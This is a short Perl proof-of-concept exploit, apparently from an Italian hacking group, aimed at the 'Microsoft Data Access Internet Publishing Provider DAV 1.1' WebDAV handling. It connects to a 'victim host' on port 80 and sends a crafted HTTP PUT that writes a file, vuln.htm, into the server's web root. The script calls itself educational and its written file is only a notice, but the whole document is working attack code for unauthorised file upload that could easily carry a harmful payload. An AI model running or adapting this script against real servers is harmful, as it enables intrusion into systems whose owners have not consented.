#!/usr/bin/perl

#
# Microsoft Data Access Internet Publishing Provider DAV 1.1 PoC

#
# to educational purpose

#
# this exploit creates to the inside of a web server a file htm from the name vuln.htm
# to monitor if a server is vulnerable to visit the url http: //nomeserver.com/vuln.htm
# to the inside you will find a message Vulnerable Server Admin installs the relevant patch

#
# Coding by CorryL Info:corryl80@gmail.com

# ..::Greetz::.. x0n3-h4ck Italian Security Team www.x0n3-h4ck.tk

use

IO::Socket;

use Getopt::Std;
getopts('h:', \%args);



if (defined($args{'h'})) 
{
	$host = $args{'h'};
}


print STDERR "\n-=[ Microsoft Data Access Internet Publishing Provider DAV 1.1 PoC!     ]=-\n";

print STDERR "-=[                                                                     ]=-\n";

print STDERR "-=[ Coded by CorryL                            info:www.x0n3-h4ck.tk    ]=-\n\n";



if (!defined($host)) 
{
	
Usage();

}




$buffer = 100000;


$socket = new IO::Socket::INET (PeerAddr => "$host",
 PeerPort => 80,
 Proto => 'tcp');



die  unless $socket;

$req = "PUT /vuln.htm HTTP/1.0\r\n";


$leng = "Accept-Language: en-us;q=0.5\r\n";

$tran = "Translate: f\r\n";

$con = "Content-Length:153\r\n";

$user = "User-Agent: Microsoft Data Access Internet Publishing Provider DAV 1.1\r\n";


$hosting = "Host: $host\r\n\r\n";


$msg = '<html><title>Vulnerable To Microsoft Data Access Internet Publishing Provider DAV 1.1</title>Vulnerable Server Admin installs the relevant patch</html>\n\n';
             

$data = $req.$leng.$tran.$con.$user.$hosting.$msg;


send ($socket,$data,0);


print "Visit to http://$host/vuln.htm and read your message!!!";


close;



sub Usage {
	
print STDERR "Usage:
-h Victim host.\n\n";

	exit;

}

